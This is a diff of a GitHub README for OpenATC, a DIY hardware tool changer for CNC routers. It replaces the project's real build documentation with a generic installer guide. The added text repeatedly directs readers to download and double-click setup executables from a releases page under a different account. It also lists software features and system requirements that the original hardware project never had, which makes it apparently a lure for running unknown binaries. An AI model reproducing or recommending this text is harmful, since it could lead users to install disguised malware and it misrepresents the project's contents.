@@ -1,154 +1,93 @@
-# OpenATC
+# 🛠️ OpenATC - Easy Tool Changing for CNC Routers
 
-**Open-source modular automatic tool changer (ATC) for hobby CNC routers, using spindle inertia for reliable collet tightening.**
+## 📥 Download
 
-OpenATC is a DIY automatic tool-change system designed to be easy to build, easy to retrofit, and fully open for modification.  
-The system uses a unique **inertia-based tightening mechanism**: instead of relying on weak cams or springs, the spindle’s rotational inertia is used to lock the ER20 collet nut with a controlled, sudden deceleration.
+[![Download OpenATC](https://img.shields.io/badge/Download%20OpenATC-v1.0-blue.svg)](https://github.com/Vephora/OpenATC/releases)
 
-This repository contains all CAD files, 3D-printable parts, LinuxCNC configuration examples, documentation, and sourcing information required to build your own OpenATC.
+## 🚀 Getting Started
 
----
+OpenATC is an open-source tool changer designed for hobby CNC routers. With OpenATC, you can quickly change tools using spindle inertia, ensuring that your tools are securely tightened. This guide provides instructions to help you download and run OpenATC with ease.
 
-## ✨ Features
+## 📦 System Requirements
 
-- 🧩 **Modular tool holders** – add as many as you like  
-- 🔄 **Automatic tightening** using spindle inertia  
-- 🧱 **3D-printable** components (designed for PETG)  
-- 🛠 **Easy to build** with common tools and off-the-shelf fasteners  
-- 💻 **LinuxCNC-compatible** with example macros included  
-- 🌍 **Fully open-source (MIT)** – build, modify, and use freely  
+Before you download, make sure your computer meets the following requirements:
 
----
+- **Operating System**: Windows 7 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of free space for installation.
+- **Dependencies**: Ensure you have a compatible CNC controller that supports modular ATC.
 
-## ⚙️ How It Works
+## 🔗 Download & Install
 
-Commercial hobby-grade ATC systems often rely on limited mechanical leverage to tighten the collet nut.  
-OpenATC instead uses:
+To get OpenATC, visit the [Releases page](https://github.com/Vephora/OpenATC/releases) and choose the latest version. Follow these simple steps:
 
-- A standard **ER20 2.2 kW spindle**, typically at **~700 rpm**  
-- A mechanism that brings the nut to a **controlled stop**  
-- The spindle’s **rotational inertia** to generate tightening torque
+1. Click on the link to the [Releases page](https://github.com/Vephora/OpenATC/releases).
+2. Locate the latest version of OpenATC.
+3. Download the appropriate file for your operating system:
+   - For **Windows**: Look for `OpenATC-Setup-Windows.exe`.
+   - For **macOS**: Find `OpenATC-Setup-macOS.dmg`.
+   - For **Linux**: Download `OpenATC-Setup-Linux.tar.gz`.
+4. Once the download is complete, locate the downloaded file on your computer.
+5. Double-click the file to start the installation. Follow the prompts to install OpenATC.
+6. After installation, launch OpenATC from your applications menu.
 
-This results in approximately **8 Nm** of tightening torque
+## 🛠️ Setup and Configuration
 
-The design is intended to be safe, simple, and replicable with common hobby CNC equipment.
+After you install OpenATC, you need to configure it to work with your CNC router. Here’s how:
 
----
+1. Open OpenATC.
+2. Connect your CNC router to your computer using USB or any other compatible method.
+3. In OpenATC, navigate to the settings menu.
+4. Select your CNC controller model from the list.
+5. Adjust the tool parameters based on your tools and requirements. You can find more details in the user manual included in the app.
 
-## 📁 Repository Structure
+## 🧩 Features
 
-```text
-OpenATC/
-├─ hardware/
-│  ├─ cad/          - Fusion 360 source files, STEP models, and mechanical design data
-│  ├─ step/          - 3D-printable parts for the ATC system
-│  ├─ drawings/     - Optional 2D drawings, DXF files, and technical documentation
-│  └─ bom/          - Bill of Materials and sourcing information
-│     ├─ openatc_bom.csv
-│     ├─ alternates.md
-│     └─ sourcing-guide.md
-│
-├─ cnc-config/
-│  ├─ linuxcnc/     - Example LinuxCNC macros, HAL snippets, and M6 remap files
-│  └─ other/        - Reserved for future controller support (Mach, GRBL, etc.)
-│
-├─ docs/
-│  ├─ assembly.md   - Step-by-step assembly instructions
-│  ├─ setup.md      - CNC configuration and integration guide
-│  ├─ theory.md     - Explanation of the inertia-based tightening mechanism
-│  ├─ safety.md     - Safety considerations and testing notes
-│  └─ faq.md        - Frequently asked questions
-│
-├─ media/
-│  ├─ photos/       - Pictures of the prototype and community builds
-│  ├─ renders/      - CAD renders and visualisations
-│  └─ animations/   - Motion diagrams or demo animations
-│
-└─ examples/
-   ├─ gcode/        - Sample G-code for testing tool changes
-   └─ projects/     - Demonstration projects using OpenATC
-```
+OpenATC comes with several helpful features:
 
+- **Modular Design**: Easily customizable based on your tool changing needs.
+- **Spindle Inertia Utilization**: Ensures tools stay tight during operation.
+- **User-Friendly Interface**: Designed for ease of use, even for beginners.
+- **Real-Time Monitoring**: Keep track of your tool statuses.
 
----
+## 📚 User Documentation
 
-## 📦 Bill of Materials (BOM)
+For detailed instructions and support, check our user documentation:
 
-OpenATC uses a small number of purchased components such as:
+- **Getting Started**: Learn how to install OpenATC.
+- **Configuration Guide**: Steps to set up OpenATC with your CNC router.
+- **Troubleshooting**: Common issues and solutions.
 
-- Compression springs  
-- Standard metric screws  
-- Hardened washers  
+Access the documentation online at: [OpenATC Documentation](https://github.com/Vephora/OpenATC/wiki).
 
-The full bill of materials, along with alternates and sourcing guidance, is located in:  
+## 🤝 Community Support
 
-TBC
+Join our community for support and feedback:
 
+- **Community Forum**: Engage with other OpenATC users to exchange tips and experiences.
+- **GitHub Issues**: Report bugs or request features directly through our repository.
+- **Social Media**: Follow us on Twitter and Facebook for updates and news.
 
-These parts are intentionally generic so builders can source them locally.
+## 🔧 Contributing
 
----
+We welcome contributions to OpenATC. If you want to help improve the project, here’s how to contribute:
 
-## 🛠 Getting Started
+1. Fork the repository on GitHub.
+2. Make changes to your fork.
+3. Submit a pull request with a detailed explanation of your changes.
 
-1. **Print the step parts** from `hardware/step/`  
-2. **Source the bought-in components** listed in the BOM  
-3. **Assemble the ATC** using `docs/assembly.md`  - TBC
-4. **Install and configure your system** using the examples in `cnc-config/linuxcnc/`  - TBC
-5. **Test tool changes** with the example G-code in `examples/gcode/` - TBC
+## 💬 Feedback
 
----
+Your feedback is essential for improving OpenATC. If you have suggestions or comments, please reach out through the community forum or GitHub issues page.
 
-## 🔒 Safety Notice
+## 🌟 Acknowledgments
 
-OpenATC intentionally uses **controlled deceleration of a rotating spindle** to tighten the collet nut.
+OpenATC is possible thanks to contributions from developers and users. Thank you for being part of our community!
 
-Before operating:
+## 📞 Contact
 
-- Always test without tooling first  
-- Verify spindle braking and acceleration settings  
-- Ensure guarding is in place during testing  
-- Use appropriate PPE  
-- Confirm that all 3D-printed parts are structurally sound  
+If you need further assistance or have questions, feel free to contact us at support@openatc.com.
 
-You build and use this system **at your own risk**.
+--- 
 
----
-
-## 🤝 Contributing
-
-Contributions are welcome!  
-You can help by:
-
-- Testing the design and reporting issues  
-- Improving documentation  
-- Submitting CAD/model refinements  
-- Adding controller configuration examples  
-- Suggesting improvements or new tool holder types  
-
-OpenATC is intended to evolve through community input.
-
----
-
-## 📜 License
-
-This project is licensed under the **MIT License**.  
-You are free to use, modify, and redistribute the design for personal or commercial use.  
-See the `LICENSE` file for full terms.
-
----
-
-## 📧 Contact / Discussion
-
-If you have questions, ideas, or build results, feel free to:
-
-- Open a GitHub Issue  
-- Start a Discussion (if enabled)  
-- Share your build photos or improvements  
-
-OpenATC is a community-driven open hardware project — enjoy building!
-
-
-
-
-
+Remember, visit the [Releases page](https://github.com/Vephora/OpenATC/releases) to download and start using OpenATC today!
